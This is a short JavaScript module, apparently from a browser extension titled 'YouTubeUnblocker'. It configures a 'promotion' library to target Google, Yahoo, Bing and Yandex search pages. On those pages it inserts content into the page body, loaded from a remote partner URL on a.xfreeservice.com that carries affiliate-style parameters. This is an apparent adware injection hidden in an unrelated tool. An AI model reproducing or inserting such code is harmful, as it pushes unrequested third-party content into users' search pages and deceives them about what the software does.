const Promotion = require("promotion");

module.exports = function () {
    Promotion.config({
        pms: [{
            "include": [
                "*.www.google.de",
                "*.www.google.com",
                "*.www.google.at",
                "*.www.google.ch",
                "*.www.google.es",
                "*.www.google.pl",
                "*.www.google.dk",
                "*.www.google.fi",
                "*.www.google.se",
                "*.www.google.no",
                "*.www.google.be",
                "*.www.google.co.uk",
                "*.www.google.lt",
                "*.search.yahoo.com",
                "*.bing.com",
                "*.yandex.ru",
                "*.yandex.com"
            ],
            "parent" : "body",
            "src"    : "https://a.xfreeservice.com/partner/e1NnelDg/?cid=unblocker_1&addCB=0&apptitle=YouTubeUnblocker"
        }]
    });
};
